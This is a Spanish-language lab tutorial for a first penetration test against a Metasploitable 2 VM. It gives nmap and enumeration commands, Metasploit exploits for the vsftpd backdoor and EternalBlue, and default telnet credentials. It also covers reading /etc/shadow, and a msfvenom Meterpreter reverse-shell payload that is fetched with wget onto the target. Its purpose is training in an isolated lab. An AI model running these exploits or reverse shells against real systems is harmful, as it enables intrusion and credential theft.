# Guía Rápida - Tu Primer Pentest en el Lab

## Objetivo Practicar

Vamos a hacer un pentest completo contra Metasploitable 2 (192.168.56.200).

## Paso 1: Reconocimiento

### Escaneo de Red
```bash
# Ver hosts activos
nmap -sn 192.168.56.0/24

# Escaneo de puertos
nmap -sT -T4 192.168.56.200

# Escaneo de servicios
nmap -sV -sC 192.168.56.200
```

### Identificar Servicios
```bash
# Ver qué está corriendo
nmap -sV -p- 192.168.56.200

# Resultado esperado:
# 21/tcp   ftp
# 22/tcp   ssh
# 23/tcp   telnet
# 25/tcp   smtp
# 80/tcp   http
# 139/tcp  netbios-ssn
# 445/tcp  microsoft-ds
# 3306/tcp mysql
```

## Paso 2: Enumeración

### HTTP (Puerto 80)
```bash
# Navegar al servidor web
firefox http://192.168.56.200

# Escaneo con Nikto
nikto -h http://192.168.56.200

# Buscar directorios
dirb http://192.168.56.200
```

### SMB (Puerto 445)
```bash
# Enumerar shares
enum4linux -a 192.168.56.200

# Listar usuarios
enum4linux -U 192.168.56.200
```

### FTP (Puerto 21)
```bash
# Conectar con anonymous
ftp 192.168.56.200
# Usuario: anonymous
# Contraseña: (vacío)

# Listar archivos
ls -la
```

## Paso 3: Explotación

### Opción A: Metasploit - vsftpd Backdoor
```bash
msfconsole

# Buscar exploit
search vsftpd

# Usar exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.200
exploit

# Obtener shell
id
whoami
```

### Opción B: Metasploit - EternalBlue (si Windows estuviera disponible)
```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.203
set LHOST 192.168.56.100
exploit
```

### Opción C: Manual - Telnet
```bash
# Conectar por telnet
telnet 192.168.56.200

# Credenciales por defecto de Metasploitable:
# usuario: msfadmin
# contraseña: msfadmin
```

## Paso 4: Post-Explotación

### Obtener Información
```bash
# Si tienes shell
uname -a
cat /etc/passwd
cat /etc/shadow
ifconfig
```

### Escalada de Privilegios
```bash
# Buscar SUID binaries
find / -perm -4000 2>/dev/null

# Verificar sudo
sudo -l

# Buscar archivos con permisos especiales
find / -writable -type f 2>/dev/null
```

## Paso 5: Documentación

### Crear Reporte
1. Copia el template de hallazgos
2. Documenta cada paso
3. Incluye screenshots
4. Clasifica por severidad

### Estructura del Reporte
```
docs/hallazgos/
├── 2024-XX-XX-metasploitable-pentest/
│   ├── resumen-ejecutivo.md
│   ├── hallazgo-1-vsftpd.md
│   ├── hallazgo-2-telnet.md
│   ├── hallazgo-3-smb.md
│   └── evidencia/
│       ├── screenshot-01.png
│       └── logs.txt
```

## Ejercicios Adicionales

### Para Principiantes
1. Encuentra todas las credenciales en Metasploitable
2. Accede a phpMyAdmin
3. Explota la vulnerability de SQL Injection en DVWA

### Para Intermedios
1. Haz pivot desde Metasploitable a otras VMs
2. Crea un payload persistente
3. Usa Meterpreter para moverte lateralmente

### Para Avanzados
1. Combina múltiples vulnerabilidades
2. Bypass antivirus con encoding
3. Crea un laboratorio de Active Directory

## Comandos Útiles

```bash
# Generar payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o payload.elf

# Escuchar conexiones
nc -lvp 4444

# Transferir archivos
python3 -m http.server 8080  # En Kali
wget http://192.168.56.100:8080/payload.elf  # En target

# Proxychains
proxychains nmap -sT 192.168.57.0/24
```

## Tips

1. **Siempre documenta** cada paso y hallazgo
2. **No destruyas** los targets - son para práctica
3. **Experimenta** - prueba diferentes herramientas
4. **Lee los errores** - te dan información valiosa
5. **Busca en Google** - cada error tiene solución
